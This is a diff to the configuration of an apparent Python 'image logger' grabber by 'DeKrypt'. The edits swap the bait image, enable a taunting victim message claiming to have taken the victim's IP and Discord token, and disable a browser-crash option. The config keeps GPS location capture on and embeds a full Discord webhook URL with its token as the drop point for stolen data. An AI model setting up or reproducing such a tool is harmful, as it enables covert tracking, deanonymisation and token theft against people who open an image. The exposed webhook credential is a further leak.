@@ -13,7 +13,7 @@ __author__ = "DeKrypt"
 config = {
     # BASE CONFIG #
     "webhook": "https://discord.com/api/webhooks/1351294511422115961/82hgW6p2IbNQiX9bOBGLtyvNPAKfncTUkObQNIMcc1kq0fTGbtpSxmGrVe-JsZywxntk",
-    "image": "https://ih1.redbubble.net/image.4597249639.2296/raf,360x360,075,t,fafafa:ca443f4786.u1.jpg", # You can also have a custom image by using a URL argument
+    "image": "https://i.postimg.cc/7P0P6wQW/raf-360x360-075-t-fafafa-ca443f4786-u1.jpg", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
     # CUSTOMIZATION #
@@ -21,12 +21,12 @@ config = {
     "color": 0x00FFFF, # Hex Color you want for the embed (Example: Red is 0xFF0000)
 
     # OPTIONS #
-    "crashBrowser": True, # Tries to crash/freeze the user's browser, may not work. (I MADE THIS, SEE https://github.com/dekrypted/Chromebook-Crasher)
+    "crashBrowser": False, # Tries to crash/freeze the user's browser, may not work. (I MADE THIS, SEE https://github.com/dekrypted/Chromebook-Crasher)
     
     "accurateLocation": True, # Uses GPS to find users exact location (Real Address, etc.) disabled because it asks the user which may be suspicious.
 
     "message": { # Show a custom message when the user opens the image
-        "doMessage": False, # Enable the custom message?
+        "doMessage": True, # Enable the custom message?
         "message": "Hey! Your Ip and Discord Token is no mine !", # Message to show
         "richMessage": True, # Enable rich text? (See README for more info)
     },
